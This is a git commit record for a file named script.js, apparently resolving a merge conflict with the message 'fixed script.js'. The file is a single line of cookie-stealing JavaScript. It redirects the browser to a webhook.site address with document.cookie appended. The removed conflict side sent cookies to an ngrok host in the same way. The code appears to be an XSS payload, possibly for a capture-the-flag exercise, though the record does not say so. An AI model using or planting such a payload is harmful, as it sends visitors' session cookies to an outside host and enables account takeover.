ad0e3a64fbd846df87209b59f5ab4f9a4af5ad30
avishaigonen123 <avishaigonen@gmail.com>
2025-06-14 22:48:36 +0300

    fixed script.js

--- script.js
+++ script.js
@@ -1,5 +1,1 @@
-<<<<<<< HEAD
-window.location.href = "https://36bf-138-199-7-239.ngrok-free.app/?cookies="+document.cookie;
-=======
 window.location.href = "https://webhook.site/b9845d0e-4624-4ee7-89c9-90bfd2b1d3eb/?cookies="+document.cookie;
->>>>>>> 71e184dc480eec8be98545c9f6ab9371b4a237d0
